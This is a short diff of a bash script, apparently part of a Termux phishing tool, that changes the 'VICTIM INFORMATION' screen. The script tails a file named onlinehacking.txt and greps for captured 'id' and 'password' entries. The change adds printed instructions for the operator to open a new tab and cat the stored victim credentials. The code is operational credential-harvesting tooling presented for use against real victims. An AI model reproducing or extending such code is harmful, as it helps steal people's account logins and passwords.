@@ -365,8 +365,11 @@ ash1() {
 			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			   echo 
 			   echo -e "\e[96m========================\e[92m    SUMAN © 2021    \e[96m========================= \e[92m"
+			   echo   
+			   echo -e "\e[95m Victim Information no show to Open Termux New Tab And Paste This Command :- \e[95m"
+			   echo
+			   echo -e "\e[93mcd $HOME && cd .. && cd usr && cd bin && cd phs && cd Redemption-Code && cat onlinehacking.txt \e[93m"
                            echo 
-			   touch onlinehacking.txt >> /dev/null 2>&1
                            tail -f onlinehacking.txt | grep -e "id" -e "password"      
 
                            break;
